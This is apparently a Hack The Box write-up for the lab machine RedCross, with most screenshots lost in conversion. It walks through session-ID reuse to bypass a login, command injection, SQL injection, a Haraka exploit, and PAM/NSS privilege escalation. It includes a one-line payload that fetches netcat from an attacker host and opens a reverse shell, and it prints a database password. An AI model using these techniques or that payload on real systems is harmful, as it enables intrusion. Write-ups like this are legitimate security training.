# RedCross

*Converted from: RedCross.pdf*

---

# RedCross
## **11 [th] April 2019 / Document No D19.100.13**

**Prepared By: egre55**

**Machine Author: ompamo**

**Difficulty: Medium**

**Classification: Official**



Page 1 / 16


## **SYNOPSIS**

RedCross is a medium difficulty box that features XSS, OS commanding, SQL injection, remote

exploitation of a vulnerable application, and privilege escalation via PAM/NSS.


## **Skills Required**


  - Intermediate Linux knowledge

  - Basic knowledge of Web enumeration

tools

  - Knowledge of common web

vulnerabilities


## **Skills Learned**


  - Authentication bypass technique via

PHP Session ID reuse

  - Identification and exploitation of a

vulnerable application

  - Privilege escalation via PAM/NSS


Page 2 / 16


​ ​


​ ​


## **Enumeration** **Nmap**

nmap -Pn -sS -p-​ 10.10.10.113 ​


Nmap output shows SSH and a web server. The IP redirects to [https://intra.redcross.htb​](https://intra.redcross.htb/),​ and

whatweb shows this is Apache 2.4.25.


Page 3 / 16



​ ​


​ ​



​ ​


​ ​


​


## **intra.redcross.htb**

After adding **intra.redcross.htb** ​ to "/etc/hosts", the RedCross Messaging Intranet page is

accessible.


The contact form:

​



Page 4 / 16



​



​


## **Dirbuster**

Dirbuster (with the small, lowercase list) finds additional directories:


Searching for common document extensions under "/documentation" reveals the file

"account-signup.pdf".



Page 5 / 16


## **Authenticated access**

The request for credentials is sent:


Temporary "guest" privileges have been given while the request is being processed.


There doesn’t seem to be much functionality available after logging in as guest:



Page 6 / 16


## **admin.redcross.htb**

It is worth checking for subdomains, and common names such as "internal" and "admin" are also

added to "/etc/hosts". admin.redcross.htb is a valid subdomain, and hosts a login form.


Brute forcing isn’t successful, but after replacing the existing PHP Session ID with the one from

intra.redcross.htb using a cookie manager and refreshing the page, access is gained to the IT

Admin panel.


Page 7 / 16


## **SSH**

"User Management" allows a user to be created on RedCross, and "Network Access" makes SSH

available externally to the specified IP address.


Page 8 / 16


## **XSS**

Further inspection of the admin panel reveals that it is vulnerable to XSS.



Page 9 / 16


## **OS Command Injection**

It is possible to inject commands into the "ip" parameter, and the output is returned.


A shell is received as www-data:



Page 10 / 16


## **SQL Injection**

Introducing a single quote in the "o" parameter results in a SQL error.


Exploitation is automated using sqlmap, and hashes are found.





Page 11 / 16


As expected, the guest account hash is cracked, but no success is had with the other accounts.


Page 12 / 16


## **Haraka Exploitation**

After adding the IP address to the whitelist, nmap is run again. Other ports are now accessible.


A Haraka installation is available on port 1025, and it is a vulnerable version.


Page 13 / 16


​



The exploit is copied locally and it is edited to use the correct port number.


The RCE test is successful and pings are received.


After preparing the web server and standing up a listener, the following payload is used and a

shell as "penelope" is received.


cd /tmp; wget http://10.10.14.9:8443/nc; chmod 777 ./nc; ./nc 10.10.14.9 443 -e /bin/bash​


Page 14 / 16



​



​



​


## **Privilege Escalation** **PostgreSQL, PAM and Name Service Switch (NSS)**

Enumeration of the web folders reveals PostgreSQL credentials.


unixusrmgr:dheu%7wjx8B&





Inspection of the tables "\dt" reveals "passwd_table". It seems that PAM/NSS is configured. Useful

reference:


[https://serverfault.com/a/538503](https://serverfault.com/a/538503)





It is possible to change the gid, and therefore elevate privileges. This can be done by adding the

user to the "disk" group:





Page 15 / 16


After logging back in over SSH, debugfs is used to read the root flag.


Or by adding the user to the "sudo" group, and getting a root shell:





Page 16 / 16


